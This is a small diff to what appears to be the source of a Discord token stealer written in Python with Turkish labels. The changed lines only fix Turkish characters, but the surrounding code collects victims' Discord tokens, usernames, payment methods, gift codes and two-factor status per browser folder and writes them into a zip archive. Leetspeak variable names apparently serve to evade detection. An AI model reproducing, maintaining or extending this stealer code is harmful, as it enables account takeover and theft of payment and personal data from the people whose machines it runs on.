@@ -718,9 +718,9 @@ Public IP infos:
             except: software_name, path = "Unknown", "Unknown"
 
             file_discord_account = file_discord_account + f"""
-Discord Hesabı n°{str(number_discord_account)}:
+Discord Hesabin °{str(number_discord_account)}:
 - Bulundugu Klasor      : {path}
-- Tarayıci              : {software_name}
+- Tarayici             : {software_name}
 - Token                 : {token_d15c0rd}
 - Isim                  : {u53rn4m3_d15c0rd}
 - Takma ad              : {d15pl4y_n4m3_d15c0rd}
@@ -733,7 +733,7 @@ Discord Hesabı n°{str(number_discord_account)}:
 - Fatura                : {p4ym3nt_m3th0d5_d15c0rd}
 - Hediye kodu           : {g1ft_c0d35_d15c0rd}
 - Profil Resmi          : {av4t4r_ur1_d15c0rd}
-- Ikı asamalı dogrulama : {mf4_d15c0rd}
+- Iki asamali dogrulama : {mf4_d15c0rd}
 """
         zip_file.writestr(f"Discord Hesaplari ({number_discord_account}).txt", file_discord_account)
 
